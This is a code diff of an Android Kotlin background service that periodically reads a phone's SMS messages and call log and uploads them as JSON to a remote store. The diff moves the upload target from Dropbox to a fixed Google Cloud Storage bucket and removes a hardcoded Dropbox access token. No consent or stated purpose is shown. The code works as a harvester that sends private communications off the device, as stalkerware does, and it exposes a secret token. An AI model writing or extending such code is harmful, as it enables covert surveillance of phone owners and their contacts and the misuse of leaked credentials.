@@ -1,5 +1,3 @@
-package com.example.textmessageapi
-
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.PendingIntent
@@ -15,19 +13,26 @@ import android.os.IBinder
 import android.provider.CallLog
 import android.util.Log
 import androidx.core.app.NotificationCompat
-import com.dropbox.core.DbxRequestConfig
-import com.dropbox.core.v2.DbxClientV2
-import com.dropbox.core.v2.files.WriteMode
+import com.google.auth.oauth2.GoogleCredentials
+import com.google.cloud.storage.BlobId
+import com.google.cloud.storage.BlobInfo
+import com.google.cloud.storage.Storage
+import com.google.cloud.storage.StorageOptions
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayInputStream
+import java.io.FileInputStream
+import java.text.SimpleDateFormat
+import java.util.*
+import java.io.InputStream
 
 class MessageAndCallService : Service() {
 
     private val handler = Handler()
     private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
-    private lateinit var dropboxClient: DbxClientV2
+    private lateinit var storageClient: Storage
+    private val bucketName = "msg_call_10101"
 
     private val runnable = object : Runnable {
         override fun run() {
@@ -38,7 +43,7 @@ class MessageAndCallService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        setupDropboxClient()
+        setupGoogleCloudClient()
         handler.post(runnable)
         startForegroundNotification()
     }
@@ -63,10 +68,23 @@ class MessageAndCallService : Service() {
         return null
     }
 
-    private fun setupDropboxClient() {
-        val accessToken = "sl.B6IgNZ0_UVaw-n6v7haSXlq6csgMan3oDZA4LDOCrY_XzV41p9P_v26rpHXOrFEGjMFTlx4iX9pS2dUo2tIZva1relXBo50b32VtlaAud7VUcsrZeUfEF4-9cK7JOrzA03Uy6TGpQD6I9d9LbuGaMbE"
-        val config = DbxRequestConfig.newBuilder("dropbox/android-textmessageapi").build()
-        dropboxClient = DbxClientV2(config, accessToken)
+    private fun setupGoogleCloudClient() {
+        try {
+            // Open the credentials.json file from the assets folder
+            val credentialsStream: InputStream = this.assets.open("credentials.json")  // 'this' refers to the Service context
+            // Load Google credentials from the input stream
+            val credentials = GoogleCredentials.fromStream(credentialsStream)
+
+            // Initialize Google Cloud Storage client with the credentials
+            storageClient = StorageOptions.newBuilder()
+                .setCredentials(credentials)
+                .build()
+                .service
+
+            Log.d(TAG, "Google Cloud client initialized successfully")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error loading Google Cloud credentials", e)
+        }
     }
 
     private fun collectMessagesAndCalls() {
@@ -98,9 +116,10 @@ class MessageAndCallService : Service() {
             }
         }
 
-        // Upload data to Dropbox in a coroutine
+        // Upload data to Google Cloud Storage in a coroutine
         scope.launch {
-            uploadDataToDropbox("messages.json", messages.toString())
+            val formattedData = formatDataForUpload(messages)
+            uploadDataToGoogleCloud("messages.json", formattedData)
         }
     }
 
@@ -129,22 +148,32 @@ class MessageAndCallService : Service() {
             }
         }
 
-        // Upload data to Dropbox in a coroutine
+        // Upload data to Google Cloud Storage in a coroutine
         scope.launch {
-            uploadDataToDropbox("calls.json", calls.toString())
+            val formattedData = formatDataForUpload(calls)
+            uploadDataToGoogleCloud("calls.json", formattedData)
         }
     }
 
-    private suspend fun uploadDataToDropbox(fileName: String, data: String) {
+    private fun formatDataForUpload(contents: JSONArray): String {
+        val timestamp = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
+        return JSONObject().apply {
+            put("Content", contents)
+            put("Time", timestamp)
+        }.toString()
+    }
+
+    private suspend fun uploadDataToGoogleCloud(fileName: String, data: String) {
         withContext(Dispatchers.IO) {
             try {
+                val blobId = BlobId.of(bucketName, fileName)
+                val blobInfo = BlobInfo.newBuilder(blobId).setContentType("application/json").build()
                 val inputStream = ByteArrayInputStream(data.toByteArray())
-                dropboxClient.files().uploadBuilder("/$fileName")
-                    .withMode(WriteMode.OVERWRITE)
-                    .uploadAndFinish(inputStream)
-                Log.d(TAG, "$fileName uploaded to Dropbox")
+
+                storageClient.create(blobInfo, inputStream)
+                Log.d(TAG, "$fileName uploaded to Google Cloud Storage")
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to upload $fileName to Dropbox", e)
+                Log.e(TAG, "Failed to upload $fileName to Google Cloud Storage", e)
             }
         }
     }
